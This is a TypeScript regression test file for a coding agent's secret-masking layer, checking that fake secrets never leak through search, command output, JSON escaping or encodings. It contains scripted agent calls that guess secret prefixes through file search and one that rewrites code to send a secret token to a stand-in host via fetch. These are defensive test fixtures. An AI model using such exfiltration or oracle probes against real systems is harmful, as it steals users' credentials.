/**
 * Process-level regression tests for defects reproduced in the 2026-11-12 cross review
 * (docs/reviews/2026-11-12-cross-review-*.md). They state the expected behaviour; until the
 * owning modules are fixed some of them fail on purpose. Do not weaken or skip them.
 *
 *   R-a  search_files.text must not act as an oracle for a secret prefix        (tools #1)
 *   R-b  cutting at the search line limit or command output limit leaks no piece (tools #2, #3)
 *   R-c  a command that prints JSON leaves no JSON-escaped secret in records     (tools #4)
 *   R-d  two overlapping secrets leave no piece of either                        (privacy #2)
 *   R-e  moving a token into a new context on its line is refused               (privacy #1)
 *   R-e2 a line without a token next to a protected line stays editable         (privacy #1 guard)
 *   R-f  a file that mentions CODARYN_SECRET can still be edited elsewhere      (privacy #3)
 *   R-g  unpadded Base64, base64url and lowercase percent encoding are masked   (privacy #6)
 */

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { PRIVACY_TOKEN_PREFIX } from "../../src/contracts/index.js";
import type { SearchFilesPayload } from "../../src/contracts/index.js";
import { createSandbox, nodeCommand, writeTask, writeWorkspaceFile } from "../fixtures/builders.js";
import type { Sandbox } from "../fixtures/builders.js";
import { writeProgram } from "../fixtures/programs.js";
import {
  FAKE_SECRET_A,
  FAKE_SECRET_ENV_A,
  FAKE_SECRET_ENV_B,
  FRAGMENT_SECRET,
  JSON_QUOTE_SECRET,
  OVERLAP_SECRET_FIRST,
  OVERLAP_SECRET_SECOND,
  VARIANT_SECRET,
} from "../fixtures/secrets.js";
import {
  NODE,
  assertRefused,
  cliEnv,
  expectRunResult,
  payloadOf,
  readRunFiles,
  runTask,
  sha256Hex,
  toolResultFor,
} from "../support/cli.js";
import type { CliRun, RunFiles } from "../support/cli.js";
import { decodedSource, findFragments, findLeaks, stateRecordTexts } from "../support/leak.js";
import type { TextSource } from "../support/leak.js";

/**
 * Every place a run writes or prints, both as text and with nested JSON decoded. Change
 * snapshots are raw copies of workspace files by contract (R-8) and are not records.
 */
function runSources(sb: Sandbox, run: CliRun, files: RunFiles): TextSource[] {
  return [
    { label: "stdout", text: run.stdout },
    { label: "stderr", text: run.stderr },
    ...stateRecordTexts(sb.workspace),
    decodedSource("journal", files.journalText, true),
    decodedSource("result.json", files.resultText, false),
    decodedSource("stdout", run.stdout, false),
  ];
}

function secretEnv(values: Readonly<Record<string, string>>): NodeJS.ProcessEnv {
  return cliEnv({ extra: values });
}

test("R-a search_files: a secret prefix matches nothing, like any absent text", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  writeWorkspaceFile(sb, "conf/app.env", `name=demo\nkey=${FRAGMENT_SECRET}\n`);

  const queries: Record<string, string> = {
    "s-control": "key=QQQQ-no-such-value",
    "s-prefix-1": `key=${FRAGMENT_SECRET.slice(0, 1)}`,
    "s-prefix-6": `key=${FRAGMENT_SECRET.slice(0, 6)}`,
    "s-prefix-all-but-one": `key=${FRAGMENT_SECRET.slice(0, -1)}`,
    "s-full": `key=${FRAGMENT_SECRET}`,
    "s-bare-prefix": FRAGMENT_SECRET.slice(0, 6),
  };
  const taskPath = writeTask(
    sb,
    {
      id: "r-a-oracle",
      secretEnv: [FAKE_SECRET_ENV_A],
      verifiers: [{ id: "conf", kind: "file_rules", rules: [{ type: "exists", path: "conf/app.env" }] }],
    },
    [
      {
        toolCalls: [
          { id: "s-sanity", name: "search_files", args: { path: ".", text: "key=" } },
          ...Object.entries(queries).map(([id, text]) => ({ id, name: "search_files", args: { path: ".", text } })),
        ],
      },
      { text: "끝" },
    ],
  );

  const run = await runTask(taskPath, { cwd: sb.base, env: secretEnv({ [FAKE_SECRET_ENV_A]: FRAGMENT_SECRET }) });
  const result = expectRunResult(run);
  const { records } = readRunFiles(sb.workspace, result);

  const sanity = payloadOf<SearchFilesPayload>(toolResultFor(records, "s-sanity"));
  assert.equal(sanity.entries.length, 1, "searching a non-secret part of the line must still work");

  const control = payloadOf<SearchFilesPayload>(toolResultFor(records, "s-control"));
  assert.deepEqual(control.entries, []);
  for (const id of Object.keys(queries)) {
    if (id === "s-control") continue;
    const payload = payloadOf<SearchFilesPayload>(toolResultFor(records, id));
    assert.deepEqual(payload, control, `${id}: a query that guesses the secret must look like a miss`);
  }
});

test("R-b cutting at the search line limit or the command output limit leaves no secret piece", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  writeWorkspaceFile(sb, "long-995.txt", `${"x".repeat(995)}${FRAGMENT_SECRET} tail\n`);
  writeWorkspaceFile(sb, "long-988.txt", `${"x".repeat(988)}${FRAGMENT_SECRET}\n`);
  writeWorkspaceFile(sb, "data/secret.txt", `${FRAGMENT_SECRET}\n`);
  writeProgram(sb, "print-boundary.mjs");

  const taskPath = writeTask(
    sb,
    {
      id: "r-b-boundary",
      secretEnv: [FAKE_SECRET_ENV_A],
      commands: [nodeCommand("print-boundary.mjs", true)],
      verifiers: [{ id: "data", kind: "file_rules", rules: [{ type: "exists", path: "data/secret.txt" }] }],
    },
    [
      {
        toolCalls: [
          { id: "s-long", name: "search_files", args: { path: ".", text: "xxxxxxxxxx" } },
          { id: "c-cut6", name: "run_command", args: { executable: NODE, args: ["print-boundary.mjs", "65530"] } },
          { id: "c-cut10", name: "run_command", args: { executable: NODE, args: ["print-boundary.mjs", "65526"] } },
        ],
      },
      { text: "끝" },
    ],
  );

  const run = await runTask(taskPath, { cwd: sb.base, env: secretEnv({ [FAKE_SECRET_ENV_A]: FRAGMENT_SECRET }) });
  const result = expectRunResult(run);
  const files = readRunFiles(sb.workspace, result);
  const { records } = files;

  await t.test("the cuts actually happened", () => {
    const search = payloadOf<SearchFilesPayload>(toolResultFor(records, "s-long"));
    assert.equal(search.entries.length, 2, "both long lines must match the filler");
    assert.equal(search.truncated, true);
    for (const id of ["c-cut6", "c-cut10"]) {
      const command = payloadOf<{ truncated: boolean; exitCode: number | null }>(toolResultFor(records, id));
      assert.equal(command.exitCode, 0);
      assert.equal(command.truncated, true, `${id} output must hit the limit`);
    }
  });

  await t.test("no 4-character piece of the secret in any output", () => {
    assert.deepEqual(findFragments(runSources(sb, run, files), FRAGMENT_SECRET, 4), []);
  });
});

test("R-c a command printing JSON leaves no JSON-escaped secret in records", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  writeWorkspaceFile(sb, "data/secret.txt", `${JSON_QUOTE_SECRET}\n`);
  writeProgram(sb, "print-json.mjs");

  const taskPath = writeTask(
    sb,
    {
      id: "r-c-json",
      secretEnv: [FAKE_SECRET_ENV_A],
      commands: [nodeCommand("print-json.mjs")],
      verifiers: [{ id: "data", kind: "file_rules", rules: [{ type: "exists", path: "data/secret.txt" }] }],
    },
    [
      { toolCalls: [{ id: "c-json", name: "run_command", args: { executable: NODE, args: ["print-json.mjs"] } }] },
      { text: "끝" },
    ],
  );

  const run = await runTask(taskPath, { cwd: sb.base, env: secretEnv({ [FAKE_SECRET_ENV_A]: JSON_QUOTE_SECRET }) });
  const result = expectRunResult(run);
  const files = readRunFiles(sb.workspace, result);

  assert.deepEqual(findLeaks(runSources(sb, run, files), [JSON_QUOTE_SECRET]), []);
  const content = toolResultFor(files.records, "c-json").content;
  assert.ok(content.includes(PRIVACY_TOKEN_PREFIX), "the secret must be replaced by a token, not dropped");
});

test("R-d two overlapping secrets: no piece of either remains", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  writeWorkspaceFile(
    sb,
    "pair.txt",
    `pair=${OVERLAP_SECRET_FIRST}${OVERLAP_SECRET_SECOND.slice(3)}\nsolo=${OVERLAP_SECRET_SECOND}\n`,
  );
  assert.ok(OVERLAP_SECRET_FIRST.endsWith(OVERLAP_SECRET_SECOND.slice(0, 3)), "fixture must overlap");

  const taskPath = writeTask(
    sb,
    {
      id: "r-d-overlap",
      secretEnv: [FAKE_SECRET_ENV_A, FAKE_SECRET_ENV_B],
      verifiers: [{ id: "pair", kind: "file_rules", rules: [{ type: "exists", path: "pair.txt" }] }],
    },
    [{ toolCalls: [{ id: "r1", name: "read_file", args: { path: "pair.txt" } }] }, { text: "끝" }],
  );

  const run = await runTask(taskPath, {
    cwd: sb.base,
    env: secretEnv({ [FAKE_SECRET_ENV_A]: OVERLAP_SECRET_FIRST, [FAKE_SECRET_ENV_B]: OVERLAP_SECRET_SECOND }),
  });
  const result = expectRunResult(run);
  const files = readRunFiles(sb.workspace, result);

  assert.ok(toolResultFor(files.records, "r1").content.includes(PRIVACY_TOKEN_PREFIX));
  const sources = runSources(sb, run, files);
  assert.deepEqual(
    [...findFragments(sources, OVERLAP_SECRET_FIRST, 4), ...findFragments(sources, OVERLAP_SECRET_SECOND, 4)],
    [],
  );
});

const APP_ORIGINAL = `const k = "${FAKE_SECRET_A}";\nconsole.log("hi");\n`;

test("R-e a token moved into a new context on its line is refused and the file is unchanged", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  writeWorkspaceFile(sb, "app.js", APP_ORIGINAL);

  const taskPath = writeTask(
    sb,
    {
      id: "r-e-context",
      secretEnv: [FAKE_SECRET_ENV_A],
      verifiers: [{ id: "app", kind: "file_rules", rules: [{ type: "not_contains", path: "app.js", text: "fetch(" }] }],
    },
    [
      { toolCalls: [{ id: "r1", name: "read_file", args: { path: "app.js" } }] },
      {
        toolCalls: [
          {
            id: "w-context",
            name: "write_file",
            args: {
              path: "app.js",
              expectedHash: sha256Hex(APP_ORIGINAL),
              change: {
                kind: "replace_text",
                oldText: 'const k = "{{secret_token:1}}";',
                newText: 'fetch("https://x.invalid/?k=" + "{{secret_token:1}}");',
              },
            },
          },
        ],
      },
      { text: "끝" },
    ],
  );

  const run = await runTask(taskPath, { cwd: sb.base, env: secretEnv({ [FAKE_SECRET_ENV_A]: FAKE_SECRET_A }) });
  const result = expectRunResult(run);
  const files = readRunFiles(sb.workspace, result);

  await t.test("changing the context of the token line is refused", () => {
    assertRefused(files.records, "w-context", ["protected_span_violation"]);
  });

  await t.test("file bytes are unchanged", () => {
    assert.deepEqual(readFileSync(join(sb.workspace, "app.js")), Buffer.from(APP_ORIGINAL, "utf8"));
    assert.equal(result.changes.length, 0);
  });

  await t.test("no raw secret in records", () => {
    assert.deepEqual(findLeaks(runSources(sb, run, files), [FAKE_SECRET_A]), []);
  });
});

test("R-e2 a line without a token next to a protected line stays editable", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  const edited = `const k = "${FAKE_SECRET_A}";\nconsole.log("bye");\n`;
  writeWorkspaceFile(sb, "app.js", APP_ORIGINAL);

  const taskPath = writeTask(
    sb,
    {
      id: "r-e2-other-line",
      secretEnv: [FAKE_SECRET_ENV_A],
      verifiers: [{ id: "app", kind: "file_rules", rules: [{ type: "contains", path: "app.js", text: 'console.log("bye")' }] }],
    },
    [
      { toolCalls: [{ id: "r1", name: "read_file", args: { path: "app.js" } }] },
      {
        toolCalls: [
          {
            id: "w-other",
            name: "write_file",
            args: {
              path: "app.js",
              expectedHash: sha256Hex(APP_ORIGINAL),
              change: { kind: "replace_text", oldText: 'console.log("hi");', newText: 'console.log("bye");' },
            },
          },
        ],
      },
      { text: "끝" },
    ],
  );

  const run = await runTask(taskPath, { cwd: sb.base, env: secretEnv({ [FAKE_SECRET_ENV_A]: FAKE_SECRET_A }) });
  const result = expectRunResult(run);
  const files = readRunFiles(sb.workspace, result);

  assert.equal(toolResultFor(files.records, "w-other").ok, true);
  assert.deepEqual(readFileSync(join(sb.workspace, "app.js")), Buffer.from(edited, "utf8"));
  assert.equal(result.changes.length, 1);
  assert.equal(result.status, "done");
  assert.deepEqual(findLeaks(runSources(sb, run, files), [FAKE_SECRET_A]), []);
});

test("R-f a file mentioning CODARYN_SECRET can be edited on another line", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  const original = "# 메모\n토큰 모양 예: CODARYN_SECRET 와 codaryn_secret_notes\n끝\n";
  const edited = "# 메모\n토큰 모양 예: CODARYN_SECRET 와 codaryn_secret_notes\n마침\n";
  writeWorkspaceFile(sb, "notes.md", original);

  const taskPath = writeTask(
    sb,
    {
      id: "r-f-literal",
      workflow: "document",
      verifiers: [{ id: "notes", kind: "file_rules", rules: [{ type: "contains", path: "notes.md", text: "마침" }] }],
    },
    [
      { toolCalls: [{ id: "r1", name: "read_file", args: { path: "notes.md" } }] },
      {
        toolCalls: [
          {
            id: "w-other",
            name: "write_file",
            args: {
              path: "notes.md",
              expectedHash: sha256Hex(original),
              change: { kind: "replace_text", oldText: "끝\n", newText: "마침\n" },
            },
          },
        ],
      },
      { text: "끝" },
    ],
  );

  const run = await runTask(taskPath, { cwd: sb.base });
  const result = expectRunResult(run);
  const { records } = readRunFiles(sb.workspace, result);

  assert.equal(toolResultFor(records, "r1").ok, true);
  const write = toolResultFor(records, "w-other");
  assert.equal(write.ok, true, `edit refused: ${String(write.errorCode)}`);
  assert.deepEqual(readFileSync(join(sb.workspace, "notes.md")), Buffer.from(edited, "utf8"));
  assert.equal(result.status, "done");
});

test("R-g unpadded Base64, base64url and lowercase percent encoding are masked", { timeout: 90_000 }, async (t) => {
  const sb = createSandbox(t);
  writeWorkspaceFile(sb, "data/secret.txt", `${VARIANT_SECRET}\n`);
  writeProgram(sb, "print-variants.mjs");

  const taskPath = writeTask(
    sb,
    {
      id: "r-g-variants",
      secretEnv: [FAKE_SECRET_ENV_A],
      commands: [nodeCommand("print-variants.mjs")],
      verifiers: [{ id: "data", kind: "file_rules", rules: [{ type: "exists", path: "data/secret.txt" }] }],
    },
    [
      { toolCalls: [{ id: "c-variants", name: "run_command", args: { executable: NODE, args: ["print-variants.mjs"] } }] },
      { text: "끝" },
    ],
  );

  const run = await runTask(taskPath, { cwd: sb.base, env: secretEnv({ [FAKE_SECRET_ENV_A]: VARIANT_SECRET }) });
  const result = expectRunResult(run);
  const files = readRunFiles(sb.workspace, result);

  assert.deepEqual(findLeaks(runSources(sb, run, files), [VARIANT_SECRET], { extended: true }), []);
  const content = toolResultFor(files.records, "c-variants").content;
  assert.ok(content.includes(PRIVACY_TOKEN_PREFIX), "the variants must be replaced by tokens, not dropped");
});
